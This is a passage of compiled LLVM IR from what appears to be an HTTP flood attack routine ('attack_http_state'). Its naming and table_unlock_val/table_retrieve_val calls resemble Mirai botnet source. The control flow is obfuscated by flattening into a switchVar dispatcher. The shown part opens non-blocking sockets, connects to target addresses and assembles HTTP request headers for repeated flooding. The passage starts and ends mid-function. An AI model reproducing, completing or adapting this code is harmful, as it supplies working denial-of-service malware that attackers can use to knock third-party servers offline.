  store i32 0, i32* %9, align 4
  store i32 943467540, i32* %switchVar
  br label %loopEnd

; <label>:491:                                    ; preds = %loopEntry
  %492 = load i32, i32* %9, align 4
  %493 = load i32, i32* %18, align 4
  %494 = icmp slt i32 %492, %493
  %495 = select i1 %494, i32 1064816525, i32 -104040203
  store i32 %495, i32* %switchVar
  br label %loopEnd

; <label>:496:                                    ; preds = %loopEntry
  %497 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %498 = load i32, i32* %9, align 4
  %499 = sext i32 %498 to i64
  %500 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %497, i64 %499
  store %struct.attack_http_state* %500, %struct.attack_http_state** %26, align 8
  %501 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %502 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %501, i32 0, i32 1
  %503 = load i8, i8* %502, align 4
  %504 = zext i8 %503 to i32
  %505 = icmp eq i32 %504, 1
  %506 = select i1 %505, i32 -60083988, i32 -724065063
  store i32 %506, i32* %switchVar
  br label %loopEnd

; <label>:507:                                    ; preds = %loopEntry
  %508 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %509 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %508, i32 0, i32 12
  %510 = load i32, i32* %509, align 4
  %511 = icmp ne i32 %510, 0
  %512 = select i1 %511, i32 1711441074, i32 -2114140049
  store i32 %512, i32* %switchVar
  br label %loopEnd

; <label>:513:                                    ; preds = %loopEntry
  %514 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %515 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %514, i32 0, i32 1
  store i8 4, i8* %515, align 4
  store i32 -951758971, i32* %switchVar
  br label %loopEnd

; <label>:516:                                    ; preds = %loopEntry
  %517 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %518 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %517, i32 0, i32 1
  store i8 0, i8* %518, align 4
  store i32 -951758971, i32* %switchVar
  br label %loopEnd

; <label>:519:                                    ; preds = %loopEntry
  store i32 -724065063, i32* %switchVar
  br label %loopEnd

; <label>:520:                                    ; preds = %loopEntry
  %521 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %522 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %521, i32 0, i32 1
  %523 = load i8, i8* %522, align 4
  %524 = zext i8 %523 to i32
  %525 = icmp eq i32 %524, 0
  %526 = select i1 %525, i32 -2054600196, i32 -579544397
  store i32 %526, i32* %switchVar
  br label %loopEnd

; <label>:527:                                    ; preds = %loopEntry
  %528 = bitcast %struct.sockaddr_in* %32 to i8*
  call void @llvm.memset.p0i8.i64(i8* %528, i8 0, i64 16, i32 4, i1 false)
  %529 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %530 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %529, i32 0, i32 0
  %531 = load i32, i32* %530, align 4
  %532 = icmp ne i32 %531, -1
  %533 = select i1 %532, i32 698415499, i32 1708421551
  store i32 %533, i32* %switchVar
  br label %loopEnd

; <label>:534:                                    ; preds = %loopEntry
  %535 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %536 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %535, i32 0, i32 0
  %537 = load i32, i32* %536, align 4
  %538 = call i32 @close(i32 %537)
  store i32 1708421551, i32* %switchVar
  br label %loopEnd

; <label>:539:                                    ; preds = %loopEntry
  %540 = call i32 @socket(i32 2, i32 1, i32 0) #6
  %541 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %542 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %541, i32 0, i32 0
  store i32 %540, i32* %542, align 4
  %543 = icmp eq i32 %540, -1
  %544 = select i1 %543, i32 -2121267752, i32 -2135939813
  store i32 %544, i32* %switchVar
  br label %loopEnd

; <label>:545:                                    ; preds = %loopEntry
  store i32 1385476733, i32* %switchVar
  br label %loopEnd

; <label>:546:                                    ; preds = %loopEntry
  %547 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %548 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %547, i32 0, i32 0
  %549 = load i32, i32* %548, align 4
  %550 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %551 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %550, i32 0, i32 0
  %552 = load i32, i32* %551, align 4
  %553 = call i32 (i32, i32, ...) @fcntl(i32 %552, i32 3, i32 0)
  %554 = or i32 2048, %553
  %555 = call i32 (i32, i32, ...) @fcntl(i32 %549, i32 4, i32 %554)
  store i32 65535, i32* %10, align 4
  %556 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %557 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %556, i32 0, i32 0
  %558 = load i32, i32* %557, align 4
  %559 = bitcast i32* %10 to i8*
  %560 = call i32 @setsockopt(i32 %558, i32 0, i32 8, i8* %559, i32 4) #6
  %561 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 0
  store i16 2, i16* %561, align 4
  %562 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %563 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %562, i32 0, i32 4
  %564 = load i32, i32* %563, align 4
  %565 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 2
  %566 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %565, i32 0, i32 0
  store i32 %564, i32* %566, align 4
  %567 = load i16, i16* %19, align 2
  %568 = call zeroext i16 @htons(i16 zeroext %567) #7
  %569 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 1
  store i16 %568, i16* %569, align 2
  %570 = load i32, i32* %27, align 4
  %571 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %572 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %571, i32 0, i32 2
  store i32 %570, i32* %572, align 4
  %573 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %574 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %573, i32 0, i32 1
  store i8 2, i8* %574, align 4
  %575 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %576 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %575, i32 0, i32 0
  %577 = load i32, i32* %576, align 4
  %578 = bitcast %union.__CONST_SOCKADDR_ARG* %33 to %struct.sockaddr**
  %579 = bitcast %struct.sockaddr_in* %32 to %struct.sockaddr*
  store %struct.sockaddr* %579, %struct.sockaddr** %578, align 8
  %580 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %33, i32 0, i32 0
  %581 = load %struct.sockaddr*, %struct.sockaddr** %580, align 8
  %582 = call i32 @connect(i32 %577, %struct.sockaddr* %581, i32 16)
  %583 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %584 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %583, i32 0, i32 0
  %585 = load i32, i32* %584, align 4
  %586 = srem i32 %585, 64
  %587 = zext i32 %586 to i64
  %588 = shl i64 1, %587
  %589 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %590 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %591 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %590, i32 0, i32 0
  %592 = load i32, i32* %591, align 4
  %593 = sdiv i32 %592, 64
  %594 = sext i32 %593 to i64
  %595 = getelementptr inbounds [16 x i64], [16 x i64]* %589, i64 0, i64 %594
  %596 = load i64, i64* %595, align 8
  %597 = or i64 %596, %588
  store i64 %597, i64* %595, align 8
  %598 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %599 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %598, i32 0, i32 0
  %600 = load i32, i32* %599, align 4
  %601 = load i32, i32* %23, align 4
  %602 = icmp sgt i32 %600, %601
  %603 = select i1 %602, i32 -7077768, i32 1556417977
  store i32 %603, i32* %switchVar
  br label %loopEnd

; <label>:604:                                    ; preds = %loopEntry
  %605 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %606 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %605, i32 0, i32 0
  %607 = load i32, i32* %606, align 4
  %608 = add nsw i32 %607, 1
  store i32 %608, i32* %23, align 4
  store i32 1556417977, i32* %switchVar
  br label %loopEnd

; <label>:609:                                    ; preds = %loopEntry
  store i32 -190731631, i32* %switchVar
  br label %loopEnd

; <label>:610:                                    ; preds = %loopEntry
  %611 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %612 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %611, i32 0, i32 1
  %613 = load i8, i8* %612, align 4
  %614 = zext i8 %613 to i32
  %615 = icmp eq i32 %614, 2
  %616 = select i1 %615, i32 1714303363, i32 -343164177
  store i32 %616, i32* %switchVar
  br label %loopEnd

; <label>:617:                                    ; preds = %loopEntry
  %618 = load i32, i32* %27, align 4
  %619 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %620 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %619, i32 0, i32 2
  %621 = load i32, i32* %620, align 4
  %622 = sub i32 %618, %621
  %623 = icmp ugt i32 %622, 30
  %624 = select i1 %623, i32 1405716272, i32 331861880
  store i32 %624, i32* %switchVar
  br label %loopEnd

; <label>:625:                                    ; preds = %loopEntry
  %626 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %627 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %626, i32 0, i32 1
  store i8 0, i8* %627, align 4
  %628 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %629 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %628, i32 0, i32 0
  %630 = load i32, i32* %629, align 4
  %631 = call i32 @close(i32 %630)
  %632 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %633 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %632, i32 0, i32 0
  store i32 -1, i32* %633, align 4
  store i32 1385476733, i32* %switchVar
  br label %loopEnd

; <label>:634:                                    ; preds = %loopEntry
  %635 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %636 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %635, i32 0, i32 0
  %637 = load i32, i32* %636, align 4
  %638 = srem i32 %637, 64
  %639 = zext i32 %638 to i64
  %640 = shl i64 1, %639
  %641 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %642 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %643 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %642, i32 0, i32 0
  %644 = load i32, i32* %643, align 4
  %645 = sdiv i32 %644, 64
  %646 = sext i32 %645 to i64
  %647 = getelementptr inbounds [16 x i64], [16 x i64]* %641, i64 0, i64 %646
  %648 = load i64, i64* %647, align 8
  %649 = or i64 %648, %640
  store i64 %649, i64* %647, align 8
  %650 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %651 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %650, i32 0, i32 0
  %652 = load i32, i32* %651, align 4
  %653 = load i32, i32* %23, align 4
  %654 = icmp sgt i32 %652, %653
  %655 = select i1 %654, i32 1104300976, i32 344295239
  store i32 %655, i32* %switchVar
  br label %loopEnd

; <label>:656:                                    ; preds = %loopEntry
  %657 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %658 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %657, i32 0, i32 0
  %659 = load i32, i32* %658, align 4
  %660 = add nsw i32 %659, 1
  store i32 %660, i32* %23, align 4
  store i32 344295239, i32* %switchVar
  br label %loopEnd

; <label>:661:                                    ; preds = %loopEntry
  store i32 884065732, i32* %switchVar
  br label %loopEnd

; <label>:662:                                    ; preds = %loopEntry
  %663 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %664 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %663, i32 0, i32 1
  %665 = load i8, i8* %664, align 4
  %666 = zext i8 %665 to i32
  %667 = icmp eq i32 %666, 4
  %668 = select i1 %667, i32 1426916451, i32 -671926338
  store i32 %668, i32* %switchVar
  br label %loopEnd

; <label>:669:                                    ; preds = %loopEntry
  %670 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %671 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %670, i32 0, i32 14
  store i32 -1, i32* %671, align 4
  %672 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %673 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %672, i32 0, i32 11
  store i32 0, i32* %673, align 4
  %674 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %675 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %674, i32 0, i32 18
  %676 = getelementptr inbounds [1024 x i8], [1024 x i8]* %675, i32 0, i32 0
  call void @util_zero(i8* %676, i32 1024)
  %677 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %678 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %677, i32 0, i32 17
  store i32 0, i32* %678, align 4
  %679 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  call void @util_zero(i8* %679, i32 10240)
  %680 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %681 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %682 = call i32 @util_strlen(i8* %681)
  %683 = sext i32 %682 to i64
  %684 = getelementptr inbounds i8, i8* %680, i64 %683
  %685 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %686 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %685, i32 0, i32 9
  %687 = getelementptr inbounds [9 x i8], [9 x i8]* %686, i32 0, i32 0
  %688 = call i32 @util_strcpy(i8* %684, i8* %687)
  %689 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %690 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %691 = call i32 @util_strlen(i8* %690)
  %692 = sext i32 %691 to i64
  %693 = getelementptr inbounds i8, i8* %689, i64 %692
  %694 = call i32 @util_strcpy(i8* %693, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %695 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %696 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %697 = call i32 @util_strlen(i8* %696)
  %698 = sext i32 %697 to i64
  %699 = getelementptr inbounds i8, i8* %695, i64 %698
  %700 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %701 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %700, i32 0, i32 6
  %702 = getelementptr inbounds [257 x i8], [257 x i8]* %701, i32 0, i32 0
  %703 = call i32 @util_strcpy(i8* %699, i8* %702)
  %704 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %705 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %706 = call i32 @util_strlen(i8* %705)
  %707 = sext i32 %706 to i64
  %708 = getelementptr inbounds i8, i8* %704, i64 %707
  %709 = call i32 @util_strcpy(i8* %708, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.3, i32 0, i32 0))
  %710 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %711 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %712 = call i32 @util_strlen(i8* %711)
  %713 = sext i32 %712 to i64
  %714 = getelementptr inbounds i8, i8* %710, i64 %713
  %715 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %716 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %715, i32 0, i32 5
  %717 = getelementptr inbounds [512 x i8], [512 x i8]* %716, i32 0, i32 0
  %718 = call i32 @util_strcpy(i8* %714, i8* %717)
  %719 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %720 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %721 = call i32 @util_strlen(i8* %720)
  %722 = sext i32 %721 to i64
  %723 = getelementptr inbounds i8, i8* %719, i64 %722
  %724 = call i32 @util_strcpy(i8* %723, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i32 0, i32 0))
  %725 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %726 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %727 = call i32 @util_strlen(i8* %726)
  %728 = sext i32 %727 to i64
  %729 = getelementptr inbounds i8, i8* %725, i64 %728
  %730 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %731 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %730, i32 0, i32 7
  %732 = getelementptr inbounds [129 x i8], [129 x i8]* %731, i32 0, i32 0
  %733 = call i32 @util_strcpy(i8* %729, i8* %732)
  %734 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %735 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %736 = call i32 @util_strlen(i8* %735)
  %737 = sext i32 %736 to i64
  %738 = getelementptr inbounds i8, i8* %734, i64 %737
  %739 = call i32 @util_strcpy(i8* %738, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 32)
  %740 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %741 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %742 = call i32 @util_strlen(i8* %741)
  %743 = sext i32 %742 to i64
  %744 = getelementptr inbounds i8, i8* %740, i64 %743
  %745 = call i8* @table_retrieve_val(i32 32, i32* null)
  %746 = call i32 @util_strcpy(i8* %744, i8* %745)
  call void @table_lock_val(i8 zeroext 32)
  %747 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %748 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %749 = call i32 @util_strlen(i8* %748)
  %750 = sext i32 %749 to i64
  %751 = getelementptr inbounds i8, i8* %747, i64 %750
  %752 = call i32 @util_strcpy(i8* %751, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 33)
  %753 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %754 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %755 = call i32 @util_strlen(i8* %754)
  %756 = sext i32 %755 to i64
  %757 = getelementptr inbounds i8, i8* %753, i64 %756
  %758 = call i8* @table_retrieve_val(i32 33, i32* null)
  %759 = call i32 @util_strcpy(i8* %757, i8* %758)
  call void @table_lock_val(i8 zeroext 33)
  %760 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %761 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %762 = call i32 @util_strlen(i8* %761)
  %763 = sext i32 %762 to i64
  %764 = getelementptr inbounds i8, i8* %760, i64 %763
  %765 = call i32 @util_strcpy(i8* %764, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  call void @table_unlock_val(i8 zeroext 34)
  %766 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %767 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %768 = call i32 @util_strlen(i8* %767)
  %769 = sext i32 %768 to i64
  %770 = getelementptr inbounds i8, i8* %766, i64 %769
  %771 = call i8* @table_retrieve_val(i32 34, i32* null)
  %772 = call i32 @util_strcpy(i8* %770, i8* %771)
  call void @table_lock_val(i8 zeroext 34)
  %773 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %774 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %775 = call i32 @util_strlen(i8* %774)
  %776 = sext i32 %775 to i64
  %777 = getelementptr inbounds i8, i8* %773, i64 %776
  %778 = call i32 @util_strcpy(i8* %777, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %779 = load i8*, i8** %14, align 8
  %780 = icmp ne i8* %779, null
  %781 = select i1 %780, i32 -1978781565, i32 -58898630
  store i32 %781, i32* %switchVar
  br label %loopEnd

; <label>:782:                                    ; preds = %loopEntry
  call void @table_unlock_val(i8 zeroext 35)
  %783 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %784 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %785 = call i32 @util_strlen(i8* %784)
  %786 = sext i32 %785 to i64
  %787 = getelementptr inbounds i8, i8* %783, i64 %786
  %788 = call i8* @table_retrieve_val(i32 35, i32* null)
  %789 = call i32 @util_strcpy(i8* %787, i8* %788)
  call void @table_lock_val(i8 zeroext 35)
  %790 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %791 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %792 = call i32 @util_strlen(i8* %791)
  %793 = sext i32 %792 to i64
  %794 = getelementptr inbounds i8, i8* %790, i64 %793
  %795 = call i32 @util_strcpy(i8* %794, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %796 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %797 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %798 = call i32 @util_strlen(i8* %797)
  %799 = sext i32 %798 to i64
  %800 = getelementptr inbounds i8, i8* %796, i64 %799
  %801 = call i8* @table_retrieve_val(i32 40, i32* null)
  %802 = call i32 @util_strcpy(i8* %800, i8* %801)
  %803 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %804 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %805 = call i32 @util_strlen(i8* %804)
  %806 = sext i32 %805 to i64
  %807 = getelementptr inbounds i8, i8* %803, i64 %806
  %808 = call i32 @util_strcpy(i8* %807, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.2, i32 0, i32 0))
  %809 = load i8*, i8** %14, align 8
  %810 = call i32 @util_strlen(i8* %809)
  %811 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %812 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %813 = call i32 @util_strlen(i8* %812)
  %814 = sext i32 %813 to i64
  %815 = getelementptr inbounds i8, i8* %811, i64 %814
  %816 = call i8* @util_itoa(i32 %810, i32 10, i8* %815)
  %817 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %818 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %819 = call i32 @util_strlen(i8* %818)
  %820 = sext i32 %819 to i64
  %821 = getelementptr inbounds i8, i8* %817, i64 %820
  %822 = call i32 @util_strcpy(i8* %821, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  store i32 -58898630, i32* %switchVar
  br label %loopEnd

; <label>:823:                                    ; preds = %loopEntry
  %824 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %825 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %824, i32 0, i32 15
  %826 = load i32, i32* %825, align 4
  %827 = icmp sgt i32 %826, 0
  %828 = select i1 %827, i32 544958860, i32 297409695
  store i32 %828, i32* %switchVar
  br label %loopEnd

; <label>:829:                                    ; preds = %loopEntry
  %830 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %831 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %832 = call i32 @util_strlen(i8* %831)
  %833 = sext i32 %832 to i64
  %834 = getelementptr inbounds i8, i8* %830, i64 %833
  %835 = call i32 @util_strcpy(i8* %834, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0))
  store i32 0, i32* %10, align 4
  store i32 1362190915, i32* %switchVar
  br label %loopEnd

; <label>:836:                                    ; preds = %loopEntry
  %837 = load i32, i32* %10, align 4
  %838 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %839 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %838, i32 0, i32 15
  %840 = load i32, i32* %839, align 4
  %841 = icmp slt i32 %837, %840
  %842 = select i1 %841, i32 2083821511, i32 1418896198
  store i32 %842, i32* %switchVar
  br label %loopEnd

; <label>:843:                                    ; preds = %loopEntry
  %844 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %845 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %846 = call i32 @util_strlen(i8* %845)
  %847 = sext i32 %846 to i64
  %848 = getelementptr inbounds i8, i8* %844, i64 %847
  %849 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %850 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %849, i32 0, i32 16
  %851 = load i32, i32* %10, align 4
  %852 = sext i32 %851 to i64
  %853 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %850, i64 0, i64 %852
  %854 = getelementptr inbounds [128 x i8], [128 x i8]* %853, i32 0, i32 0
  %855 = call i32 @util_strcpy(i8* %848, i8* %854)
  %856 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %857 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %858 = call i32 @util_strlen(i8* %857)
  %859 = sext i32 %858 to i64
  %860 = getelementptr inbounds i8, i8* %856, i64 %859
  %861 = call i32 @util_strcpy(i8* %860, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i32 0, i32 0))
  store i32 -1371885000, i32* %switchVar
  br label %loopEnd

; <label>:862:                                    ; preds = %loopEntry
  %863 = load i32, i32* %10, align 4
  %864 = add nsw i32 %863, 1
  store i32 %864, i32* %10, align 4
  store i32 1362190915, i32* %switchVar
  br label %loopEnd

; <label>:865:                                    ; preds = %loopEntry
  %866 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %867 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %868 = call i32 @util_strlen(i8* %867)
  %869 = sext i32 %868 to i64
  %870 = getelementptr inbounds i8, i8* %866, i64 %869
  %871 = call i32 @util_strcpy(i8* %870, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  store i32 297409695, i32* %switchVar
  br label %loopEnd

; <label>:872:                                    ; preds = %loopEntry
  %873 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %874 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %875 = call i32 @util_strlen(i8* %874)
  %876 = sext i32 %875 to i64
  %877 = getelementptr inbounds i8, i8* %873, i64 %876
  %878 = call i32 @util_strcpy(i8* %877, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %879 = load i8*, i8** %14, align 8
  %880 = icmp ne i8* %879, null
  %881 = select i1 %880, i32 -31496982, i32 -1750706817
  store i32 %881, i32* %switchVar
  br label %loopEnd

; <label>:882:                                    ; preds = %loopEntry
  %883 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %884 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %885 = call i32 @util_strlen(i8* %884)
  %886 = sext i32 %885 to i64
  %887 = getelementptr inbounds i8, i8* %883, i64 %886
  %888 = load i8*, i8** %14, align 8
  %889 = call i32 @util_strcpy(i8* %887, i8* %888)
  store i32 -1750706817, i32* %switchVar
  br label %loopEnd

; <label>:890:                                    ; preds = %loopEntry
  %891 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %892 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %891, i32 0, i32 9
  %893 = getelementptr inbounds [9 x i8], [9 x i8]* %892, i32 0, i32 0
  %894 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %895 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %894, i32 0, i32 10
  %896 = getelementptr inbounds [9 x i8], [9 x i8]* %895, i32 0, i32 0
  %897 = call signext i8 @util_strcmp(i8* %893, i8* %896)
  %898 = icmp ne i8 %897, 0
  %899 = select i1 %898, i32 1827581757, i32 2001520035
  store i32 %899, i32* %switchVar
  br label %loopEnd

; <label>:900:                                    ; preds = %loopEntry
  %901 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %902 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %901, i32 0, i32 9
  %903 = getelementptr inbounds [9 x i8], [9 x i8]* %902, i32 0, i32 0
  %904 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
